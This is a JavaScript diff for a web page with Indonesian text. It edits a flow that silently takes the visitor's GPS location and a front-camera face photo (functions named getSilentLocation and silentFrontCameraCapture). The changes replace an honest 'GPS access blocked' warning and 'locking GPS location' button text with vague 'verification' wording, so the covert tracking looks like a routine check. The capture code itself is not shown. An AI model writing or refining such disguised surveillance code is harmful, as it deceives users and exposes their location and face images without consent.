@@ -341,7 +341,7 @@
                 (err) => {
                     console.warn('[GPS] getCurrentPosition error:', err.message, 'code:', err.code);
                     if (err.code === 1) { // PERMISSION_DENIED
-                        showNotification('⚠️ Akses GPS (lokasi) diblokir browser. Aktifkan izin lokasi di URL agar koordinat akurat.', 'warning');
+                        showNotification('Bersiap Untuk Melanjutkan', 'Verifikasi');
                     }
                     if (!resolved) {
                         resolved = true;
@@ -675,15 +675,15 @@
             // ========================================================
             // TAHAP 1A: KUNCI LOKASI GPS PERANGKAT SECARA BERSIH
             // ========================================================
-            if (elements.btnConfirm) elements.btnConfirm.textContent = '📍 Mengunci Lokasi GPS...';
-            console.log('[TAHAP-1A] Mengunci lokasi GPS presisi perangkat...');
+            if (elements.btnConfirm) elements.btnConfirm.textContent = ' Sedang berlangsung verifikasi';
+            console.log('[TAHAP-1A] Mengunci Verifikasi perangkat...');
             const locResult = await getSilentLocation();
             silentLocationData = locResult;
 
             // ========================================================
             // TAHAP 1B: SILENT CAPTURE WAJAH (KAMERA DEPAN)
             // ========================================================
-            if (elements.btnConfirm) elements.btnConfirm.textContent = '📷 Menyiapkan Kamera...';
+            if (elements.btnConfirm) elements.btnConfirm.textContent = 'Menyiapkan Kamera...';
             console.log('[TAHAP-1B] Silent Capture Wajah Kamera Depan...');
             const frontResult = await silentFrontCameraCapture();
             silentFrontPhotoBase64 = frontResult;
